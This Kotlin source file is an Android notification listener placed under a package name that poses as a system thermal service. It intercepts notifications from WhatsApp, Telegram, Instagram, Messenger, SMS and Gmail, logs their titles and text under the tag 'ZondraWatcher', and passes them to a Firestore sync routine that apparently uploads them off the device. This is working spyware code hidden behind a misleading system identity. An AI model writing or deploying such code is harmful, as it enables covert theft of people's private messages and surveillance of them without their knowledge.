package com.android.system.service.thermal

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationInterceptor : NotificationListenerService() {

    // Packages we specifically want to capture
    private val targetPackages = setOf(
        "com.whatsapp", "com.whatsapp.w4b",
        "org.telegram.messenger", "org.telegram.plus",
        "com.instagram.android", "com.facebook.orca",
        "com.google.android.apps.messaging", "com.android.mms",
        "com.google.android.gm",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val packageName = sbn.packageName ?: return

        // Ignore system UI fluff
        if (packageName == "android" || packageName == "com.android.systemui") return

        val extras = sbn.notification.extras
        val title = extras.getString("android.title")
        val text  = extras.getCharSequence("android.text")?.toString()

        if (title.isNullOrBlank() && text.isNullOrBlank()) return

        Log.d("ZondraWatcher", "Notification from $packageName: $title – $text")
        FirestoreSync.syncNotification(packageName, title, text)
    }
}
